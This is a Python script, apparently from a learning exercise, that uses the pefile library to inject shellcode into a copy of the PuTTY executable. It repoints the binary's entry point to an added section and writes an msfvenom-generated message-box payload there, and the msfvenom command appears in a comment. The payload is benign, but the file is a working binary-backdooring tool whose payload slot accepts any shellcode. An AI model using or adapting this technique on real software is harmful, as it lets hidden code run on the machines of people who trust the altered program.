import pefile
import utilities


def msgbox():
    # for this example we are using the message box payload
    # msfvenom -a x86 --platform windows -p windows/messagebox \
    # TEXT="Test, Test, I'm in your code :)" ICON=INFORMATION EXITFUNC=process \
    # TITLE="Testing" -f python

    messagebox = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                       b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
                       b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
                       b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
                       b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
                       b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
                       b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
                       b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
                       b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
                       b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
                       b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
                       b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
                       b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
                       b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
                       b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
                       b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x69\x6e\x67\x58\x68"
                       b"\x54\x65\x73\x74\x31\xdb\x88\x5c\x24\x07\x89\xe3\x68"
                       b"\x3a\x29\x58\x20\x68\x6f\x64\x65\x20\x68\x75\x72\x20"
                       b"\x63\x68\x6e\x20\x79\x6f\x68\x27\x6d\x20\x69\x68\x73"
                       b"\x74\x20\x49\x68\x2c\x20\x54\x65\x68\x54\x65\x73\x74"
                       b"\x31\xc9\x88\x4c\x24\x1e\x89\xe1\x31\xd2\x6a\x40\x53"
                       b"\x51\x52\xff\xd0\xB8\x96\xFE\x46\x00\xFF\xD0")

    # jumpback = pe.OPTIONAL_HEADER.BaseOfCode + oep
    return messagebox


def payload_selection(payload):
    if 'msg' in payload:
        return msgbox()


def insert_payload(info):
    path, payload = info
    pe = pefile.PE(path)

    # We will first change the binaries entry point to be the newly injected section
    # this will run our injected code first
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.sections[-1].VirtualAddress

    # Now we have to actually load the payload into the binary
    # To do this we need the raw address of the injected section
    raw_offset = pe.sections[-1].PointerToRawData

    # Write the shellcode into the new section
    shellcode = payload_selection(payload)
    pe.set_bytes_at_offset(raw_offset, shellcode)
    pe.write(path)


if __name__ == "__main__":

    path = utilities.make_duplicate("./assets/bin/putty_injected.exe")
    info = [path,
            'msg']
    insert_payload(info)
